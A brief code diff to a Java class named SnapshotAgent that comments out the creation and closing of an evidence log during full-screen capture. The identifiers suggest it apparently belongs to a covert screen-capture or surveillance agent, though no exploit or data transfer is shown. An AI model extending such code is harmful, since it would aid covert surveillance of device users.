@@ -77,7 +77,7 @@ public class SnapshotAgent extends AgentBase {
 	 */
 	@Override
 	public void go() {
-		final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);
+		//final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);
 
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
@@ -94,7 +94,7 @@ public class SnapshotAgent extends AgentBase {
 			break;
 		}
 
-		log.close();
+		//log.close();
 	}
 
 	/*
